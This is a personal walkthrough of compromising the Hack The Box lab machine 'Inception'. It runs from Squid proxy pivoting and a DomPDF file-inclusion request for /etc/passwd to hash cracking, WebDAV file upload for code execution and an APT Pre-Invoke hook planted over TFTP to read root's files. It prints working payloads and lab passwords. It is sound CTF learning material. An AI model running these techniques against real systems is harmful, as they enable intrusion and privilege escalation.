My personal notes about solving the Inception machine in Hack The Box. 

# Let's nmap

```
# Nmap 7.60 scan initiated Wed Mar  7 13:10:55 2018 as: nmap -sV -sC -oA initial_nmap 10.10.10.67
Nmap scan report for 10.10.10.67
Host is up (0.013s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

```

There is apache & squid. Cool, I suppose.


# Squid abuse

1. nmap reveals 3128 and 80
2. nikto reveals IP 127.0.1.1 for the machine
3. metasploit squid pivot scan reveals 22 for ssh

```
 auxiliary(squid_pivot_scanning) > set RANGE 127.0.1.1
RANGE => 127.0.1.1
,3389,8080,9100quid_pivot_scanning) > set PORTS 21,80,139,443,445,1433,1521,1723 
PORTS => 21,80,139,443,445,1433,1521,1723,3389,8080,9100
msf auxiliary(squid_pivot_scanning) > run

[+] [10.10.10.67] 127.0.1.1 is alive but 21 is CLOSED
[+] [10.10.10.67] 127.0.1.1:80 seems OPEN
[+] [10.10.10.67] 127.0.1.1 is alive but 139 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 445 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 1433 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 1521 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 1723 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 3389 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 8080 is CLOSED
[+] [10.10.10.67] 127.0.1.1 is alive but 9100 is CLOSED
```

Ok, we can bypass the annoying proxy/firewall.

```
[+] [10.10.10.67] 127.0.1.1 is alive but 21 is CLOSED
[+] [10.10.10.67] 127.0.1.1:22 seems OPEN
```

4. nikto through proxy reveals server-status accessible (not accessible directly, only through the proxy)

```
curl -v --proxy1.0 10.10.10.67:3128 http://127.0.1.1/server-status > server-status
curl -v --proxy1.0 10.10.10.67:3128 http://10.10.10.67
```

So we can see what other people are doing on the machine.

# DomPDF

```
<p>The document has moved <a href="http://127.0.1.1/dompdf/">here</a>.</p>
```

DOMPDF 0.6.0 versio is vulnerable!
https://www.exploit-db.com/exploits/33004/
https://www.exploit-db.com/exploits/14851/

## LFI in DomPDF

```GET http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd```

dompdf admin UI not installed? admin is user/password hmm

group/etc/passwd reveal that IRCD is somwhere. nmap doesn't show..
username is cobb


config - REMOTE EXEC enabled! ? but but .. how to run code when firewall doesn't allow remote connections??
```def("DOMPDF_ENABLE_REMOTE", true);```


Can we fetch stuff over the VPN tunnel?

```
* Connection #0 to host 10.10.10.67 left intact
root@kali:~/htb/inception# curl --proxy1.0 10.10.10.67:3128 -v "http://127.0.1.1/dompdf/dompdf.php?input_file=http%3A%2F%2F10.10.15.124%3A8000%2Fkak.php"
*   Trying 10.10.10.67...
* TCP_NODELAY set
* Connected to 10.10.10.67 (10.10.10.67) port 3128 (#0)
> GET http://127.0.1.1/dompdf/dompdf.php?input_file=http%3A%2F%2F10.10.15.124%3A8000%2Fkak.php HTTP/1.1
```

Nope :(


# Brute loader

Difficult to figure out which files to download. So finally wrote a brute force loader..

# Password hash cracking


```
## Apache default config for site loaded through LFI
## htpasswd loaded through LFI
## rockyou rocked the password
 john --wordlist=/usr/share/wordlists/rockyou.txt passu
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
babygurl69       (webdav_tester)
```


Oh well. On to the webdav then.

# Webdav
```
davtest -quiet -url http://10.10.10.67/webdav_test_inception/ -auth webdav_tester:babygurl69

/usr/bin/davtest Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.shtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.html
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.html
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_fl786S7/davtest_fl786S7.txt
```

We get RCE. Now we have limited shell access with a limited user.
There is a wordpress site, which contains mysql creds. 

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
```

These creds can be used to gain access to user cobb. 
SSH over squid is possible: https://platonic.techfiz.info/2011/05/corkscrew-for-ssh-over-squid/

# Fake root!

Now we can log in with cobb. cobb is conveniently able to sudo to root, but root.txt has no flag! 

.temp directory reveals that this is LXD container. This was pretty evident from ps -Af that this is not a normal machine, but now there is
confirmation. What to do next to get the REAL root flag?

AAAH.

# Long search for root

There is a hint in the root.txt to look for a train. After a long and exhausting search about LX container security and such, there is FTP running at 192.168.0.1

Possible to log in with anonymous without a password. Limited access to file system, but no clear way to root it.
However, there is a configuration file for TFTP which is also running. For some specific reason

``` 
-rw-r--r--    1 0        0             118 Nov 06 05:46 tftpd-hpa
```

```
ftp 192.168.0.1
ls -la
cat tftpd-hpa 
# /etc/default/tftpd-hpa

TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
```

TFTP allows writing a ssh key to /root/.ssh/authorized_keys but the file system access rights are not correct and SSH refuses login. GRAAAAH!


But. Logs reveal that apt-get is running every five minutes. Smuggle some update through TFTP like this:

```
put 02fortitude /etc/apt/apt.conf.d/02fortitude
Dpkg::Pre-Install-Pkgs {"cat /root/root.txt > /root/.ssh/kikka.txt"; "chmod a+r /root/.ssh/kikka.txt"};

*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null
```

E: Problem executing scripts APT::Update::Post-Invoke-Success 'test -x /usr/bin/apt-show-versions || exit 0 ; apt-show-versions -i'
https://unix.stackexchange.com/questions/226993/whats-the-difference-between-dpkgpost-invoke-and-dpkgpost-invoke-success

APT::Update::Post-Invoke, which is invoked after updates, successful or otherwise (after the previous hook in the former case).

```
      RunScripts("APT::Update::Pre-Invoke");

sudo cat /etc/apt/apt.conf.d/05new-hook
APT::Update::Pre-Invoke {"cat /root/root.txt > /root/.ssh/kikka.txt"; "chmod a+r /root/.ssh/kikka.txt"};
```

So finally, APT runs our pre-invoke hook that does things!


```
root@Inception:~/kqrk# tftp
tftp> connect 192.168.0.1
tftp> put kikka.pub /root/.ssh/id_rsa.pub
Sent 397 bytes in 0.0 seconds
tftp> quit
root@Inception:~/kqrk# ssh -i kikka root@192.168.0.1
The authenticity of host '192.168.0.1 (192.168.0.1)' can't be established.
```

DONE!




